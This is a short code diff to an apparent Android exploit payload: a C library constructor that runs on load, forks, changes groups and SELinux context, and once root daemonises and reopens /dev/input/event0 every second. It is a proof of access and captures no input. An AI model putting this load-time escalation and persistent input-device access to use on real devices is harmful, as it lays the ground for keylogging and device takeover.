@@ -33,7 +33,7 @@ __attribute__((constructor)) void say_hello()
   pid_t pid = fork();
   if (pid == 0)
   {
-    LOGV("fork %d->%d", pid, orig_pid);
+    LOGV("fork %d->%d", orig_pid, getpid());
 
     if (getuid() != 0)
     {
@@ -50,7 +50,7 @@ __attribute__((constructor)) void say_hello()
         exit(0);
       }
 
-      gid_t groups[] = {1004}; //input
+      gid_t groups[] = {1004};  // input
       if (setgroups(sizeof(groups) / sizeof(groups[0]), groups) != 0)
       {
         LOGV("Unable to set groups: %s", strerror(errno));
@@ -70,7 +70,6 @@ __attribute__((constructor)) void say_hello()
 #endif
     if (selinux)
     {
-      LOGV("Set groups OK!");
       void *getcon = dlsym(selinux, "getcon");
       const char *error = dlerror();
       if (error)
@@ -111,28 +110,28 @@ __attribute__((constructor)) void say_hello()
     if (getuid() == 0)
     {
       LOGV("Got root");
-      int fd;
-      if ((fd = open("/dev/input/event0", O_RDONLY)) == -1)
+      if (daemon(0, 0) == -1)
       {
-        LOGV("Unable to open input device: %s", strerror(errno));
-      }
-      else
-      {
-        LOGV("Open input device success!");
-        close(fd);
+        LOGV("Unable to daemonize process: %s!", strerror(errno));
       }
 
-      if ((fd = open("/sbin/adbd", O_RDONLY)) == -1)
+      while (1)
       {
-        LOGV("Unable to open adbd: %s", strerror(errno));
-      }
-      else
-      {
-        LOGV("Open adbd Success!");
-        close(fd);
+        int fd;
+        if ((fd = open("/dev/input/event0", O_RDONLY)) == -1)
+        {
+          LOGV("Unable to open input device: %s", strerror(errno));
+          break;
+        }
+        else
+        {
+          LOGV("%d: Open input device success!", orig_pid);
+          close(fd);
+        }
+
+        sleep(1);
       }
     }
-
     exit(0);
   }
 }
